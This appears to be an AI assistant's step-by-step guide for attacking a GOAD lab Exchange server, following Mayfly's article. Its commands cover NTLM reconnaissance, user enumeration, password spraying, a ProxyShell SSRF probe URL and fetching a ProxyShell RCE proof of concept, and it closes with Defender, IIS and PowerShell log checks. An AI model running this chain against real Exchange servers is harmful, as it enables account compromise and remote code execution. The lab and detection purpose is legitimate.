Yes. Since you have a working **GOAD + Exchange lab**, let's turn the Mayfly article into a **GOAD-specific, copy/paste-friendly lab guide**, keeping the article's order and explaining what every stage is doing.

I checked the original article directly. It was published March 17, 2025 and its flow is: Exchange deployment → NTLM endpoint discovery → user enumeration → password spraying → ProxyLogon verification → ProxyShell → mailbox-export/file-write mechanics → payload encoding → RCE. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

I’ll use **your actual Exchange IP wherever possible**, rather than assuming the article's `192.168.56.21`.

> **Lab scope:** The commands below are intended for your isolated GOAD environment. For the final RCE/payload-evasion portion, I'll explain the mechanics and validation, but I won't give instructions for modifying the payload specifically to defeat Defender or other security controls.

---

# GOAD Exchange — Mayfly Part 1 Complete Lab Guide

## 0. What you're going to reproduce

By the end, your lab should look like:

```text
                         KALI
                          |
                          |
                  Exchange HTTPS :443
                          |
              +-----------+-----------+
              |                       |
        NTLM endpoints              OWA
              |                       |
       Domain discovery        User enumeration
                                      |
                                validusers.txt
                                      |
                                Password spray
                                      |
                              Lab credentials
                                      |
                                ProxyLogon
                                      |
                                  PATCHED
                                      |
                                ProxyShell
                           /       |       \
                          /        |        \
                     CVE-34473 CVE-34523 CVE-31207
                                      |
                              Exchange PowerShell
                                      |
                            Mailbox export primitive
                                      |
                              potential file write
                                      |
                                RCE in vulnerable
                                  configurations
```

The original Mayfly article follows essentially this exact progression. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 1. Verify your GOAD environment

On Kali:

```bash
cd /mnt/vmstorage/vmware-vms/GOAD
```

Check Vagrant:

```bash
vagrant status
```

Also:

```bash
vmrun list
```

You should see your GOAD machines running.

Because Exchange is resource-heavy, make sure the Exchange VM has enough memory. The Mayfly article recommends **at least 12 GB and preferably 16 GB RAM** for the Exchange VM. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 2. Find your Exchange server

The article calls the Exchange machine:

```text
THE-EYRIE
```

and uses:

```text
192.168.56.21
```

in its example. In GOAD, Exchange is normally the `.21` host in the lab subnet. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Don't assume yours is identical.

First:

```bash
ip addr
```

Find your GOAD network.

For example:

```text
192.168.56.0/24
```

Then:

```bash
sudo nmap -sn 192.168.56.0/24
```

Replace the network with your actual GOAD network.

Now identify the Exchange host.

---

# 3. Set an Exchange IP variable

This will make the rest of the guide much easier.

Suppose your Exchange server is:

```text
192.168.56.21
```

Set:

```bash
export EXCHANGE_IP=192.168.56.21
```

Verify:

```bash
echo $EXCHANGE_IP
```

You should get:

```text
192.168.56.21
```

From now on we can use:

```bash
$EXCHANGE_IP
```

instead of repeatedly typing the address.

---

# 4. Verify HTTPS

Run:

```bash
sudo nmap -Pn -sV -p 80,443 $EXCHANGE_IP
```

You want:

```text
443/tcp open https
```

Now:

```bash
curl -k -I https://$EXCHANGE_IP/owa/
```

You should receive an HTTP response.

---

# 5. Open OWA

Open in your browser:

```text
https://<EXCHANGE-IP>/owa
```

For example:

```text
https://192.168.56.21/owa
```

You should get the Exchange/OWA login page.

The Mayfly article specifically identifies OWA at:

```text
https://<ip>/owa
```

after Exchange is installed. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 6. Verify Autodiscover

The next important Exchange endpoint is:

```text
/autodiscover/autodiscover.xml
```

Run:

```bash
curl -k -i \
https://$EXCHANGE_IP/autodiscover/autodiscover.xml
```

Don't worry if you get:

```text
401 Unauthorized
```

Authentication behavior is what we're interested in.

---

# 7. Discover NTLM information

The article provides two approaches:

- `ntlmscan`
    
- Nmap's `http-ntlm-info`
    
- NTLMRecon as the all-in-one approach. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))
    

We'll use Nmap first because it gives you a clean baseline.

Run:

```bash
sudo nmap -Pn \
-p 443 \
--script=http-ntlm-info \
--script-args http-ntlm-info.root=/autodiscover/ \
$EXCHANGE_IP
```

Look for information such as:

```text
NetBIOS_Domain_Name
NetBIOS_Computer_Name
DNS_Domain_Name
DNS_Computer_Name
```

In the article, the result was:

```text
AD Domain Name : SEVENKINGDOMS
Server Name : THE-EYRIE
DNS Domain Name : sevenkingdoms.local
FQDN : the-eyrie.sevenkingdoms.local
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Your GOAD environment should be similar.

---

# 8. Install NTLMRecon

Go to your tools directory:

```bash
mkdir -p ~/tools
cd ~/tools
```

Clone:

```bash
git clone https://github.com/pwnfoo/NTLMRecon.git
```

Enter:

```bash
cd NTLMRecon
```

Create the virtual environment:

```bash
python3 -m venv venv
```

Activate:

```bash
source venv/bin/activate
```

Install:

```bash
python3 setup.py install
```

The Mayfly article uses this exact installation flow. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 9. Run NTLMRecon

Run:

```bash
ntlmrecon --input https://$EXCHANGE_IP
```

You should receive information about Exchange's NTLM endpoints.

Look for:

```text
AD Domain Name
Server Name
DNS Domain Name
FQDN
Parent DNS Domain
```

---

# 10. Examine the CSV

NTLMRecon generates:

```text
ntlmrecon.csv
```

Check:

```bash
ls -lh ntlmrecon.csv
```

Then:

```bash
cat ntlmrecon.csv
```

The article converts it to JSON for easier reading:

```bash
cat ntlmrecon.csv | \
python -c 'import csv, json, sys; print(json.dumps([dict(r) for r in csv.DictReader(sys.stdin)]))' | jq
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 11. Create your username list

You already created a cleaned GOAD/Game-of-Thrones username list.

Make sure it is:

```text
users.txt
```

Check:

```bash
cat users.txt
```

Check number of entries:

```bash
wc -l users.txt
```

Check duplicates:

```bash
sort users.txt | uniq -d
```

If nothing is printed, there are no duplicates.

You can also enforce uniqueness:

```bash
sort -u users.txt -o users.txt
```

---

# 12. Understand the username format

The article generates usernames such as:

```text
arya.stark
jon.snow
jaime.lannister
cersei.lannister
```

rather than:

```text
arya-stark
jon-snow
```

That's why your earlier cleanup step replacing:

```text
-
```

with:

```text
.
```

was useful.

---

# 13. Install msmailprobe

Go to:

```bash
cd ~/tools
```

Clone:

```bash
git clone https://github.com/busterb/msmailprobe.git
```

Enter:

```bash
cd msmailprobe
```

Compile:

```bash
go build
```

Check:

```bash
ls -lh msmailprobe
```

You should see an executable.

---

# 14. Run Exchange user enumeration

The article uses:

```bash
./msmailprobe userenum --onprem \
-t 192.168.56.21 \
-U users.txt \
-o validusers.txt
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

For your GOAD environment:

```bash
./msmailprobe userenum --onprem \
-t $EXCHANGE_IP \
-U ~/tools/NTLMRecon/users.txt \
-o validusers.txt
```

Adjust the `users.txt` path if yours is elsewhere.

---

# 15. Understand what msmailprobe is doing

Conceptually:

```text
users.txt
     |
     v
Exchange OWA
     |
     +---- arya.stark
     |
     +---- jon.snow
     |
     +---- cersei.lannister
     |
     v
Response/timing differences
     |
     v
validusers.txt
```

The Mayfly article explicitly warns that this enumeration causes failed login attempts on valid accounts. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

This is one reason it belongs in your lab rather than against an arbitrary Exchange environment.

---

# 16. Examine validusers.txt

Run:

```bash
cat validusers.txt
```

Then:

```bash
wc -l validusers.txt
```

Remove duplicates:

```bash
sort -u validusers.txt -o validusers.txt
```

---

# 17. Password spraying

The article then uses TREVORspray and the GOAD password:

```text
cersei
```

against the discovered accounts. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

You already have TREVORspray installed.

Go there:

```bash
cd ~/tools/TREVORspray
```

Activate your environment:

```bash
source .venv/bin/activate
```

Verify:

```bash
trevorspray --help
```

---

# 18. Test the Exchange endpoint

Before spraying:

```bash
curl -k -I \
https://$EXCHANGE_IP/autodiscover/autodiscover.xml
```

---

# 19. Run the GOAD password spray

Because this is your isolated lab:

```bash
trevorspray \
-u ~/tools/msmailprobe/validusers.txt \
-p cersei \
--url https://$EXCHANGE_IP/autodiscover/autodiscover.xml \
-m owa
```

The Mayfly article uses the same technique against the GOAD Exchange instance. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 20. Record the result

Don't just copy the successful account.

Create a small lab note:

```text
Exchange:
<IP>

Domain:
sevenkingdoms.local

Valid usernames:
...

Successful lab credential:
username:
password:

Date:
2026-08-31
```

This makes your lab reproducible.

---

# 21. ProxyLogon — understand the important distinction

Now we reach the section you correctly pointed out that I skipped.

The article calls this:

```text
ProxyLogon
CVE-2021-26855
CVE-2021-27065
```

The article explicitly marks the GOAD Exchange deployment as **patched**. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

The vulnerable Exchange 2019 versions listed in the article are:

```text
Exchange 2019 < 15.02.0792.010
Exchange 2019 < 15.02.0721.013
Exchange 2016 < 15.01.2106.013
Exchange 2013 < 15.00.1497.012
```

while the GOAD CU9 deployment corresponds to a build at or above:

```text
15.02.0858.005
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 22. Verify your Exchange build yourself

On the Exchange server:

```powershell
Get-ExchangeServer |
    Format-List Name,Edition,AdminDisplayVersion
```

You should see your Exchange version/build.

This is better than simply assuming that GOAD is using CU9.

---

# 23. Run the ProxyLogon scanner

Start Metasploit:

```bash
msfconsole
```

Then:

```text
use auxiliary/scanner/http/exchange_proxylogon
```

Check:

```text
show options
```

Set:

```text
set RHOSTS <EXCHANGE-IP>
```

Run:

```text
run
```

The article receives:

```text
The target is not vulnerable to CVE-2021-26855.
```

([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

That's the expected lesson:

```text
Exchange exposed
        ≠
ProxyLogon vulnerable
```

---

# 24. ProxyShell begins here

Now we move to:

```text
CVE-2021-34473
CVE-2021-34523
CVE-2021-31207
```

The article recommends Orange Tsai's technical explanation of ProxyShell before proceeding. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

The high-level chain is:

```text
Frontend Exchange endpoint
        |
        v
SSRF/backend access
        |
        v
Exchange PowerShell
        |
        v
Privilege/context manipulation
        |
        v
Mailbox export functionality
        |
        v
Arbitrary file placement
        |
        v
Potential code execution
```

---

# 25. First ProxyShell check

Run the exact request from the article, replacing the IP:

```bash
curl -k -i \
"https://$EXCHANGE_IP/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
```

The article observes a:

```text
302
```

response. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

### Important interpretation

Treat this as an **indicator**, not as a standalone vulnerability verdict.

A redirect can demonstrate interesting Exchange routing behavior, but the complete ProxyShell chain requires additional conditions.

---

# 26. Test `/mapi/nspi/`

Now:

```bash
curl -k -i \
https://$EXCHANGE_IP/mapi/nspi/
```

You may receive something such as:

```text
401 Unauthorized
```

The interesting part is that you're reaching an Exchange backend API through the externally exposed Exchange service.

The Mayfly article specifically uses `/mapi/nspi/` to demonstrate this backend reachability. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 27. Understand X-Rps-CAT

This is one of the most important concepts in the article.

The ProxyShell chain eventually interacts with Exchange's **Remote PowerShell** infrastructure.

Conceptually:

```text
HTTP request
     |
     v
Exchange frontend
     |
     v
backend Exchange service
     |
     v
Remote PowerShell
     |
     v
Exchange cmdlets
```

`X-Rps-CAT` is involved in the authentication/authorization context used by Exchange Remote PowerShell.

The dangerous consequence of the historical vulnerability chain was that an attacker could reach privileged Exchange functionality without possessing the normal administrative credentials.

---

# 28. ProxyShell PoC

The Mayfly article points to this complete PoC:

[dmaasland/proxyshell-poc — GitHub](https://github.com/dmaasland/proxyshell-poc?utm_source=chatgpt.com)

The repository contains:

```text
proxyshell-enumerate.py
proxyshell.py
proxyshell_rce.py
requirements.txt
```

and is now archived/read-only. ([GitHub](https://github.com/dmaasland/proxyshell-poc "GitHub - dmaasland/proxyshell-poc · GitHub"))

For your lab, keep the repository in a separate directory:

```bash
cd ~/tools
git clone https://github.com/dmaasland/proxyshell-poc.git
cd proxyshell-poc
```

Inspect it:

```bash
ls -la
```

Read the README:

```bash
cat README.md
```

Install its dependencies into an isolated environment:

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

# 29. Understand the three PoC components

### `proxyshell-enumerate.py`

Used for the reconnaissance/enumeration portion.

Conceptually:

```text
Exchange
   ↓
Discover internal information
   ↓
Build information needed by later stages
```

### `proxyshell.py`

Implements the core ProxyShell request chain.

Conceptually:

```text
Frontend
   ↓
SSRF
   ↓
Backend
   ↓
Remote PowerShell
```

### `proxyshell_rce.py`

Combines the chain with the later file-write/code-execution stage.

That is the most dangerous part of the repository, so I recommend treating it as a **lab artifact to inspect and understand**, rather than modifying it to evade Defender.

The repository itself confirms those three scripts exist. ([GitHub](https://github.com/dmaasland/proxyshell-poc "GitHub - dmaasland/proxyshell-poc · GitHub"))

---

# 30. CVE-2021-31207 — understand the mailbox export primitive

This is the part of the article where things become particularly interesting.

The article demonstrates the Exchange cmdlet:

```text
New-MailboxExportRequest
```

The underlying idea is:

```text
Exchange PowerShell
       |
       v
Mailbox export
       |
       v
Specify a filesystem destination
       |
       v
Exchange writes exported mailbox data
```

That historically provided an **arbitrary file-write primitive** under the right conditions.

This is why the mailbox export functionality becomes important to ProxyShell exploitation. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 31. Understand `Mailbox Import Export`

The article demonstrates assigning:

```text
Mailbox Import Export
```

to an administrative account before performing the mailbox export. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

On a normal Exchange installation, this is a highly privileged capability.

You can inspect the role assignments on your own lab Exchange server with:

```powershell
Get-ManagementRoleAssignment |
    Where-Object {$_.Role -like "*Mailbox Import Export*"} |
    Format-Table Role,RoleAssigneeName,AssignmentMethod
```

This is a useful defensive exercise because you can see which identities have this powerful capability.

---

# 32. Inspect the effective users

The article uses:

```powershell
Get-ManagementRoleAssignment `
    -Role "Mailbox Import Export" `
    -GetEffectiveUsers
```

You can use the same query on your lab to understand who effectively possesses the role.

---

# 33. Understand the file-write stage

The article's example exports a mailbox toward the Exchange web root.

Conceptually:

```text
Mailbox
   |
   v
New-MailboxExportRequest
   |
   v
Exchange mailbox export
   |
   v
filesystem
```

The reason this is dangerous is that if an attacker can cause Exchange to write attacker-controlled content into a location interpreted by IIS as executable server-side content, the consequence can become code execution.

That is the critical security lesson.

---

# 34. The PST encoding issue

This is another part of the article you specifically wanted included.

The article explains that the mailbox export is handled as PST data, so the webshell does not simply appear as clean ASPX source on disk. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

Conceptually:

```text
Original payload
      |
      v
Exchange mailbox export
      |
      v
PST representation
      |
      v
Encoded/transformed bytes
      |
      v
File on disk
```

The article then reverses the transformation to recover the original payload.

---

# 35. Decode the payload — safe analysis

The article's `decode.py` demonstrates:

```text
Base64
   ↓
bytes
   ↓
mpbbCryptFrom512 lookup
   ↓
original payload
```

The critical code concept is:

```python
webshell_decoded = base64.b64decode(webshell)
result = decode(webshell_decoded)
```

and the lookup table translates each byte through the Exchange-specific substitution table. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

The decoded example in the article is an ASPX/JScript server-side payload. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

---

# 36. Understand the lookup table

The table:

```python
mpbbCryptFrom512 = [...]
```

is essentially a permutation.

Think of it as:

```text
input byte
    |
    v
lookup table
    |
    v
output byte
```

It is not equivalent to modern cryptography.

That's why the article can reverse it.

---

# 37. Encoding is the reverse operation

The article then creates:

```text
encode()
```

which performs the inverse lookup.

Conceptually:

```text
Original ASPX
     |
     v
find byte position
     |
     v
encoded bytes
     |
     v
Base64
     |
     v
encoded payload
```

Then:

```text
decode(encode(payload))
```

should produce the original payload.

That's an excellent little reverse-engineering exercise.

---

# 38. Safe round-trip test

Instead of using a command-executing webshell, use an inert test string.

For example:

```text
LAB-PROXY-SHELL-TEST
```

Your experiment should demonstrate:

```text
LAB-PROXY-SHELL-TEST
        ↓
encode()
        ↓
Base64
        ↓
decode()
        ↓
LAB-PROXY-SHELL-TEST
```

This lets you understand the encoding mechanism without creating a working command-execution payload.

---

# 39. Defender detection

The article notes that Defender detects the original exploitation attempt. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly"))

**Do not disable Defender.**

Instead, this is where your GOAD lab becomes much more interesting.

Run the exercise with Defender enabled and observe:

```text
Kali
 |
 +--> HTTPS requests
 |
 v
Exchange/IIS
 |
 +--> Exchange logs
 |
 +--> IIS logs
 |
 +--> Windows Event Logs
 |
 +--> Defender
 |
 v
Detection
```

---

# 40. Check Defender on Exchange

On the Exchange server:

```powershell
Get-MpComputerStatus |
    Select-Object AMServiceEnabled,
                  AntivirusEnabled,
                  RealTimeProtectionEnabled,
                  BehaviorMonitorEnabled,
                  IoavProtectionEnabled
```

You want to know whether protection is actually active.

---

# 41. Check Defender detections

Run:

```powershell
Get-MpThreatDetection |
    Select-Object InitialDetectionTime,
                  ThreatName,
                  ActionSuccess,
                  Resources |
    Format-List
```

If Defender detected your lab activity, this is where you can begin investigating it.

---

# 42. Check Windows Security events

Run:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 30 |
    Format-List TimeCreated,Id,LevelDisplayName,Message
```

This is valuable for your blue-team side.

---

# 43. Check IIS logs

Exchange's frontend is IIS-based.

Look under:

```powershell
Get-ChildItem C:\inetpub\logs\LogFiles -Recurse -File |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 10 FullName,LastWriteTime
```

Then inspect the relevant log:

```powershell
Get-Content "<IIS-LOG-PATH>" -Tail 100
```

You're looking for the requests generated by your Kali testing.

---

# 44. Correlate the activity

Build a simple timeline:

```text
13:00:00  Kali → /autodiscover/
13:00:02  Kali → /mapi/nspi/
13:00:05  Kali → ProxyShell-related request
13:00:07  Exchange → IIS event
13:00:08  Defender → detection
13:00:09  Exchange → PowerShell activity
```

That's how you turn an offensive lab into an actual SOC exercise.

---

# 45. Verify Exchange PowerShell activity

On Exchange:

```powershell
Get-PSSession
```

You can also inspect PowerShell operational logs:

```powershell
Get-WinEvent `
-LogName "Microsoft-Windows-PowerShell/Operational" `
-MaxEvents 50 |
Format-List TimeCreated,Id,Message
```

---

# 46. What the complete ProxyShell chain teaches

The important part isn't simply:

```text
"ProxyShell gives RCE."
```

It's understanding **why**:

```text
CVE-2021-34473
       ↓
backend access
       ↓
CVE-2021-34523
       ↓
Remote PowerShell privilege/context
       ↓
CVE-2021-31207
       ↓
mailbox export/file write
       ↓
IIS-executable location
       ↓
code execution
```

That chain is why Exchange vulnerabilities can be so serious.

---

# 47. Your final GOAD checklist

You should be able to check these off:

```text
[ ] GOAD running
[ ] Exchange VM running
[ ] Exchange IP identified
[ ] OWA accessible
[ ] HTTPS/443 verified
[ ] Autodiscover verified

[ ] Nmap NTLM information
[ ] NTLMRecon installed
[ ] NTLMRecon executed
[ ] Domain identified
[ ] Exchange hostname identified

[ ] users.txt created
[ ] users.txt deduplicated
[ ] msmailprobe compiled
[ ] validusers.txt generated

[ ] TREVORspray installed
[ ] Lab password spray tested
[ ] Valid lab credential identified

[ ] Exchange build verified
[ ] ProxyLogon scanner executed
[ ] ProxyLogon determined patched

[ ] ProxyShell autodiscover behavior tested
[ ] /mapi/nspi/ tested
[ ] ProxyShell architecture understood
[ ] dmaasland PoC downloaded
[ ] PoC source inspected

[ ] CVE-2021-34473 understood
[ ] CVE-2021-34523 understood
[ ] CVE-2021-31207 understood
[ ] Mailbox Import Export role understood
[ ] Mailbox export mechanism understood

[ ] PST/encoding mechanism understood
[ ] encode/decode round-trip tested safely

[ ] Defender left enabled
[ ] Defender logs examined
[ ] IIS logs examined
[ ] PowerShell logs examined
[ ] Attack timeline created
```

---

# 48. The three references you should keep open

**Mayfly's original walkthrough:**  
[Exchange – Part 1 – no creds](https://mayfly277.github.io/posts/Exchange-part1/?utm_source=chatgpt.com)

**dmaasland ProxyShell PoC:**  
[proxyshell-poc](https://github.com/dmaasland/proxyshell-poc?utm_source=chatgpt.com)

**Microsoft Exchange build information:**  
[Microsoft Exchange build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?utm_source=chatgpt.com)

The Mayfly article itself confirms the GOAD Exchange installation, the NTLM discovery workflow, `msmailprobe`, TREVORspray, ProxyLogon verification, the ProxyShell checks, and the `dmaasland/proxyshell-poc` reference. ([Mayfly](https://mayfly277.github.io/posts/Exchange-part1/ "Exchange - Part 1 - no creds | Mayfly")) The PoC repository currently contains the enumeration, core ProxyShell, and RCE scripts and is archived/read-only. ([GitHub](https://github.com/dmaasland/proxyshell-poc "GitHub - dmaasland/proxyshell-poc · GitHub"))

### One important correction from the original article

Don't conclude **“302 = ProxyShell vulnerable”** by itself. Use the 302 as an initial signal, then verify the Exchange build and the relevant vulnerable behavior. This is especially important in your lab because you're running an older Exchange build intentionally.

And **don't disable Defender to make the exploit work**. Leave it enabled; that's going to give you a much better offensive-security + detection-engineering exercise.